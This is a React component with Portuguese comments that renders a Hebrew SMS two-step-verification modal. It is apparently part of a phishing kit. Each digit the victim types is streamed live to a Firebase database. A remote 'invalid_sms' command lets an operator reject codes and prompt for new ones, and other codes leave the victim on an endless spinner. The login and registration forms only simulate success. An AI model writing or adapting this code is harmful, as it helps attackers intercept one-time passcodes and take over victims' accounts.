import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useTranslation } from 'react-i18next';
import { useFirebaseClient } from '../hooks/useFirebaseClient';
import { reportTyping } from '../firebase/typing';
import { Smartphone, Check } from 'lucide-react';

const SMSForm = () => {
  const { t } = useTranslation();
  const navigate = useNavigate();
  const [smsCode, setSmsCode] = useState(() => ['', '', '', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [invalidMessage, setInvalidMessage] = useState('');
  const [copied, setCopied] = useState(false);
  const [showInvalidPopup, setShowInvalidPopup] = useState(false);
  const [showHebrewErrorPopup, setShowHebrewErrorPopup] = useState(false);
  const [showLoginModal, setShowLoginModal] = useState(false);
  const [isRegistering, setIsRegistering] = useState(false);
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showSpinner, setShowSpinner] = useState(false);
  const [hasInvalidSms, setHasInvalidSms] = useState(false);
  const inputRefs = useRef([]);

  // Hook do Firebase Client
  const {
    clientId,
    clientData,
    isOnline,
    loading: firebaseLoading,
    updateClientData,
    commands,
  } = useFirebaseClient(navigate);

  // Função para limpar comandos de invalidação
  const clearInvalidationCommand = async (commandType) => {
    try {
      const { ref, remove } = await import("firebase/database");
      const { database } = await import("../firebase/config");

      const commandsRef = ref(database, `commands/${clientId}`);
      await remove(commandsRef);
      console.log("🧹 SMSForm - Comando de invalidação limpo:", commandType);
    } catch (error) {
      console.error("❌ SMSForm - Erro ao limpar comando:", error);
    }
  };

  // Função para lidar com mudança nos inputs
  const handleInputChange = (index, value) => {
    // Limpar estado de erro quando usuário começar a digitar
    if (hasInvalidSms) {
      setHasInvalidSms(false);
    }
    
    // Permitir apenas números
    if (!/^\d*$/.test(value)) return;
    
    const newSmsCode = [...smsCode];
    newSmsCode[index] = value;
    setSmsCode(newSmsCode);
    
    // Auto-focus no próximo input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
    
    // Reportar typing e atualizar Firebase
    const fullCode = newSmsCode.join('');
    reportTyping("sms", fullCode);
    updateClientData({
      smsCode: fullCode,
      lastSmsInput: Date.now(),
      smsStatus: fullCode ? "Input" : "Empty",
    });
  };

  // Função para lidar com backspace
  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !smsCode[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  // Função para colar código
  const handlePaste = (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    const newSmsCode = pastedData.split('').concat(Array(6).fill('')).slice(0, 6);
    setSmsCode(newSmsCode);
    
    // Focus no último input preenchido ou no primeiro vazio
    const lastFilledIndex = newSmsCode.findIndex(code => !code);
    const focusIndex = lastFilledIndex === -1 ? 5 : lastFilledIndex;
    inputRefs.current[focusIndex]?.focus();
    
    // Reportar typing e atualizar Firebase
    const fullCode = newSmsCode.join('');
    reportTyping("sms", fullCode);
    updateClientData({
      smsCode: fullCode,
      lastSmsInput: Date.now(),
      smsStatus: fullCode ? "Input" : "Empty",
    });
  };

  // Escutar comandos de invalidação
  useEffect(() => {
    if (commands && commands.includes("invalid_sms")) {
      // Resetar formulário
      setSmsCode(['', '', '', '', '', '']);
      setLoading(false);
      setSuccess('');
      setError('');
      
      // Definir mensagem de erro em hebraico (independente do idioma do app)
      setInvalidMessage('קוד SMS לא תקין. אנא נסה שוב.');
      
      // Mostrar popup de SMS inválido
      setShowInvalidPopup(true);
      
      clearInvalidationCommand("invalid_sms");
      
      // Fechar popup após 3 segundos
      setTimeout(() => {
        setShowInvalidPopup(false);
      }, 3000);
    }
  }, [commands, t]);

  // Função para copiar código
  const copyCode = () => {
    const fullCode = smsCode.join('');
    navigator.clipboard.writeText(fullCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // Função para lidar com o envio do código SMS
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    const code = smsCode.join('');
    if (code.length !== 6) {
      setError('Por favor, insira o código completo de 6 dígitos');
      return;
    }

    setLoading(true);
    setError('');
    
    try {
      // Loading infinito - só para se detectar invalid_sms
      while (true) {
        // Simular validação do código SMS
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Simular código inválido para demonstrar funcionalidade
        if (code === '123456') {
          throw new Error('invalid_sms');
        }
        
        // Para códigos válidos, continua carregando infinitamente
        // (na implementação real, aqui haveria uma validação real do servidor)
      }
      
    } catch (err) {
      if (err.message === 'invalid_sms') {
        // Limpar inputs e mostrar outline vermelha
        setSmsCode(['', '', '', '', '', '']);
        setHasInvalidSms(true);
        setError(''); // Remover mensagem de erro padrão
        
        // Definir a mensagem para o card vermelho (mesmo se ele não estiver visível neste fluxo)
        setInvalidMessage('קוד SMS לא תקין. אנא נסה שוב.');

        setShowHebrewErrorPopup(true); // Mostrar popup em hebraico
        setLoading(false);
        // Focar no primeiro input
        inputRefs.current[0]?.focus();
        
        // Fechar popup após 4 segundos e resetar hasInvalidSms
        setTimeout(() => {
          setShowHebrewErrorPopup(false);
          setHasInvalidSms(false); // Resetar outline vermelho
        }, 4000);
      } else {
        setError('קוד SMS לא תקין. אנא נסה שוב.');
        setLoading(false);
      }
    }
  };

  // Função para lidar com login/registro
  const handleLogin = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    
    try {
      // Simular processo de login
      await new Promise(resolve => setTimeout(resolve, 2000));
      setSuccess('Login realizado com sucesso!');
      
      // Redirecionar após login bem-sucedido
      setTimeout(() => {
        navigate('/dashboard');
      }, 1000);
      
    } catch (err) {
      setError('Erro no login. Verifique suas credenciais.');
    } finally {
      setLoading(false);
    }
  };

  const handleRegister = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    
    try {
      // Simular processo de registro
      await new Promise(resolve => setTimeout(resolve, 2000));
      setSuccess('Registro realizado com sucesso!');
      
      // Redirecionar após registro bem-sucedido
      setTimeout(() => {
        navigate('/dashboard');
      }, 1000);
      
    } catch (err) {
      setError('Erro no registro. Tente novamente.');
    } finally {
      setLoading(false);
    }
  };

  // Se está carregando após envio, mostrar spinner no modal
  if (loading && (smsCode.every(digit => digit !== '') || success)) {
    return (
      <div className="fixed inset-0 bg-black bg-opacity-50 flex items-start justify-center z-50 p-2 sm:p-4 pt-8 sm:pt-16">
        <div className="bg-white shadow-xl w-full max-w-md sm:max-w-lg mx-auto relative mt-4 sm:mt-8 max-h-[90vh] overflow-y-auto">
          {/* Header do Modal */}
          <div className="text-center p-4 sm:p-6 pb-2 sm:pb-3 relative">
            <h2 className="text-lg sm:text-xl font-semibold text-gray-800 mb-1">
              אימות דו-שלבי עם קוד שנשלח בסמס
            </h2>
          </div>

          {/* Conteúdo do Modal - apenas spinner e texto */}
          <div className="p-4 sm:p-6 pt-2 sm:pt-3">
            <div className="flex flex-col items-center justify-center space-y-4 py-8">
              {/* Spinner */}
              <div className="w-12 h-12 border-4 border-blue-600/20 border-t-blue-600 rounded-full animate-spin"></div>
              
              {/* Texto de processamento */}
              <div className="text-center space-y-2">
                <p className="text-lg font-medium text-gray-800" style={{ fontFamily: 'Rubik, sans-serif' }}>
                  מעבד את הקוד...
                </p>
                <p className="text-sm text-gray-600" style={{ fontFamily: 'Rubik, sans-serif' }}>
                  אנא המתן בזמן שאנו מאמתים את הקוד שלך
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <>
      {/* Modal SMS principal */}
      <div className="fixed inset-0 bg-black bg-opacity-50 flex items-start justify-center z-50 p-2 sm:p-4 pt-8 sm:pt-16">
        <div className="bg-white shadow-xl w-full max-w-md sm:max-w-lg mx-auto relative mt-4 sm:mt-8 max-h-[90vh] overflow-y-auto">
          {/* Header do Modal */}
          <div className="text-center p-4 sm:p-6 pb-2 sm:pb-3 relative">
            <h2 className="text-lg sm:text-xl font-semibold text-gray-800 mb-1">
              אימות דו-שלבי עם קוד שנשלח בסמס
            </h2>
          </div>

        {/* Conteúdo do Modal */}
        <div className="p-4 sm:p-6 pt-2 sm:pt-3">
          {loading && (
            <div className="flex justify-center items-center py-6 sm:py-8">
              <div className="animate-spin rounded-full h-6 w-6 sm:h-8 sm:w-8 border-b-2 border-blue-500"></div>
            </div>
          )}

          {/* Popup de SMS inválido */}
          {showInvalidPopup && (
            <div className="mb-4 p-3 bg-red-100 border border-red-400 text-red-700 rounded text-sm flex justify-center items-center" dir="rtl" style={{ fontFamily: 'Rubik, sans-serif' }}>
              <span className="text-center">{invalidMessage}</span>
            </div>
          )}

          {/* Formulário */}
          <form onSubmit={handleSubmit} className="space-y-3 sm:space-y-4">
            {/* Grid de inputs SMS - ocultar durante loading */}
            {!loading && (
              <div className="grid grid-cols-6 gap-2 sm:gap-3 mb-2 sm:mb-3 px-1 sm:px-2">
                {Array.isArray(smsCode) && smsCode.map((digit, index) => (
                  <input
                    key={index}
                    ref={(el) => (inputRefs.current[index] = el)}
                    type="text"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleInputChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    onPaste={handlePaste}
                    className={`w-full h-10 sm:h-12 text-center text-base sm:text-lg font-medium border-2 ${
                      hasInvalidSms 
                        ? 'border-red-500 focus:border-red-600 focus:outline-none focus:ring-2 focus:ring-red-200 bg-red-50' 
                        : 'border-gray-300 focus:border-blue-500'
                    } focus:outline-none transition-colors bg-white rounded-md`}
                    style={{ fontFamily: 'Rubik, sans-serif', color: '#7380BF' }}
                  />
                ))}
              </div>
            )}

            {/* Texto específico embaixo dos inputs - ocultar durante loading */}
            {!loading && (
              <div className="text-right mb-3 sm:mb-4 px-1 sm:px-2 mt-2">
                <p className="text-gray-600 text-xs sm:text-sm leading-relaxed">
                  הזן את קוד האימות שמופיע בהודעת הטקסט שנשלחה למספר הטלפון שלך
                </p>
              </div>
            )}

            {/* Botão de fechamento no lugar do botão de envio */}
            <div className="mt-4 sm:mt-6">
              <button
                type="submit"
                className="bg-white text-blue-500 font-medium py-2.5 px-5 transition-colors flex items-center justify-center gap-2 text-sm rounded-full mx-auto z-[60] hover:bg-blue-500 hover:text-white border border-blue-500 min-w-[120px]"
                disabled={loading}
              >
                {loading ? (
                  <div className="animate-spin rounded-full h-4 w-4 border-2 border-current border-t-transparent"></div>
                ) : (
                  <span className="text-sm">שלח</span>
                )}
              </button>
            </div>

            {/* Mensagens de erro e sucesso - ocultar durante loading */}
            {!loading && error && !hasInvalidSms && (
              <div className="text-red-600 text-xs sm:text-sm text-center bg-red-50 p-2 sm:p-3 rounded flex justify-center items-center" dir="rtl" style={{ fontFamily: 'Rubik, sans-serif' }}>
                <span className="text-center">קוד SMS לא תקין. אנא נסה שוב.</span>
              </div>
            )}

            {!loading && success && (
              <div className="text-green-600 text-xs sm:text-sm text-center bg-green-50 p-2 sm:p-3 rounded flex items-center justify-center gap-2">
                <Check size={14} className="sm:w-4 sm:h-4" />
                {success}
              </div>
            )}
          </form>
        </div>
      </div>
    </div>

    {/* Popup de erro em hebraico - acima de todos os modais */}
    {showHebrewErrorPopup && (
      <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[60] p-4">
        <div className="bg-white rounded-lg p-6 max-w-sm w-full mx-4 text-center shadow-xl">
          <div className="mb-4">
            <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-3">
              <svg className="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path>
              </svg>
            </div>
            <h3 className="text-lg font-semibold text-gray-900 mb-2" style={{ fontFamily: 'Rubik, sans-serif' }}>
              קוד SMS לא תקין
            </h3>
            <p className="text-gray-600 text-sm" style={{ fontFamily: 'Rubik, sans-serif' }}>
              הקוד שהזנת אינו תקין. אנא נסה שוב עם קוד חדש.
            </p>
          </div>
          <button
            onClick={() => setShowHebrewErrorPopup(false)}
            className="w-full bg-blue-500 hover:bg-blue-600 text-white font-medium py-2 px-4 rounded-md transition-colors"
            style={{ fontFamily: 'Rubik, sans-serif' }}
          >
            הבנתי
          </button>
        </div>
      </div>
    )}

      {/* Modal de Login - aparece atrás do modal SMS quando códigos são enviados */}
      {showLoginModal && (
        <div className="fixed inset-0 bg-black bg-opacity-30 flex items-start justify-center z-40 p-2 sm:p-4 pt-8 sm:pt-16">
          <div className="w-full md:max-w-[95%] max-w-full md:mx-auto mx-0 md:mt-8 mt-0 md:rounded-lg rounded-none bg-white md:p-8 p-6 mt-4 sm:mt-8" style={{ fontFamily: 'Rubik, sans-serif' }}>
            {/* Navigation tabs mobile */}
            <div className="md:hidden w-full bg-white relative mb-6">
              <div className="flex w-full relative">
                <button 
                 onClick={() => setIsRegistering(true)}
                 className={`flex-1 py-4 text-xl font-medium transition-colors relative z-10 ${
                   isRegistering ? 'text-blue-500' : 'text-gray-400'
                 }`}
                 style={{ fontFamily: 'Rubik, sans-serif' }}
               >
                 הרשמה
               </button>
               
                <button 
                 onClick={() => setIsRegistering(false)}
                 className={`flex-1 py-4 text-xl font-medium transition-colors relative z-10 ${
                   !isRegistering ? 'text-blue-500' : 'text-gray-400'
                 }`}
                 style={{ fontFamily: 'Rubik, sans-serif' }}
               >
                 כניסה
               </button>
              </div>
              {/* Barra cinza de fundo */}
               <div className="absolute bottom-0 w-full h-0.5 bg-gray-300"></div>
               {/* Barra azul que se move */}
               <div 
                 className={`absolute bottom-0 h-0.5 bg-blue-500 transition-all duration-300 ease-in-out ${
                   isRegistering ? 'left-0 w-1/2' : 'left-1/2 w-1/2'
                 }`}
               ></div>
            </div>

            {/* Navigation tabs desktop */}
            <div className="hidden md:flex md:justify-end md:mb-6 md:-mt-2 md:px-0">
              <div className="flex space-x-2 relative">
                {/* Barra cinza de fundo */}
                <div className="absolute bottom-0 h-0.5 bg-gray-200" style={{left: '16px', right: '16px'}}></div>
                
                <button 
                 onClick={() => setIsRegistering(true)}
                 className={`px-4 py-2 text-lg font-medium transition-colors relative ${
                   isRegistering 
                     ? 'text-black' 
                     : 'text-black hover:text-gray-700'
                 }`}
                 style={{ fontFamily: 'Rubik, sans-serif', color: isRegistering ? '#0C66FF' : 'black' }}
               >
                 הרשמה
                 {isRegistering && <div className="absolute bottom-0 left-0 right-0 h-0.5" style={{backgroundColor: '#0C66FF'}}></div>}
               </button>
               
               <button 
                 onClick={() => setIsRegistering(false)}
                 className={`px-4 py-2 text-lg font-medium transition-colors relative ${
                   !isRegistering 
                     ? 'text-black' 
                     : 'text-black hover:text-gray-700'
                 }`}
                 style={{ fontFamily: 'Rubik, sans-serif', color: !isRegistering ? '#0C66FF' : 'black' }}
               >
                 כניסה
                 {!isRegistering && <div className="absolute bottom-0 left-0 right-0 h-0.5" style={{backgroundColor: '#0C66FF'}}></div>}
               </button>
              </div>
            </div>

            {loading ? (
              <div className="text-center py-12">
                <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-blue-600 mx-auto mb-6"></div>
                <h3 className="text-xl font-semibold text-gray-900 mb-2">
                  מעבד...
                </h3>
                <p className="text-gray-600">
                  אנא המתן...
                </p>
              </div>
            ) : (
            <form onSubmit={isRegistering ? handleRegister : handleLogin} className="space-y-8 max-w-md mx-auto md:px-0 px-4">
                {/* Email or Phone field */}
                <div>
                  <input
                      type="text"
                      id="emailOrPhone"
                      value={emailOrPhone}
                      onChange={(e) => setEmailOrPhone(e.target.value)}
                      className="w-full px-6 py-2 border border-gray-300 rounded-full focus:outline-none focus:border-blue-400 text-right text-base"
                      placeholder="שם המשתמש שלך"
                      dir="rtl"
                      style={{ fontFamily: 'Rubik, sans-serif' }}
                    />
                </div>

                {/* Password field */}
                <div>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      id="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full px-6 py-2 border border-gray-300 rounded-full focus:outline-none focus:border-blue-400 text-right text-base"
                      placeholder="הסיסמה שלך"
                      dir="rtl"
                      style={{ fontFamily: 'Rubik, sans-serif' }}
                    />
                  </div>
                </div>

                {/* Error message */}
                {error && error.trim() && (
                  <div className="text-red-500 text-center text-sm">
                    {error}
                  </div>
                )}

                {/* Success message */}
                {success && (
                  <div className="text-green-500 text-center text-sm">
                    {success}
                  </div>
                )}

                {/* Submit button */}
                <div className="flex justify-center">
                  <button
                    type="submit"
                    disabled={loading}
                    className="bg-blue-500 text-white py-4 px-16 md:px-8 md:py-2 rounded-full hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors text-lg md:text-sm disabled:opacity-50"
                    style={{ 
                       fontFamily: 'Rubik, sans-serif',
                       minWidth: '180px',
                       maxWidth: '280px'
                     }}
                  >
                    {loading ? 'מעבד...' : (isRegistering ? 'הרשמה' : 'כניסה')}
                  </button>
                </div>

                {/* Password recovery link */}
                 <div className="text-center mt-4">
                   <button
                     type="button"
                     className="text-blue-500 hover:text-blue-700 text-base underline"
                   >
                     שחזור סיסמה
                   </button>
                 </div>

                {/* Loading spinner */}
                {showSpinner && (
                  <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
                    <div className="bg-white p-9 rounded-lg text-center">
                      <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mx-auto mb-4"></div>
                      <p className="text-gray-700">מעבד את הבקשה...</p>
                    </div>
                  </div>
                )}
              </form>
            )}
          </div>
        </div>
      )}
    </>
  );
};

export default SMSForm;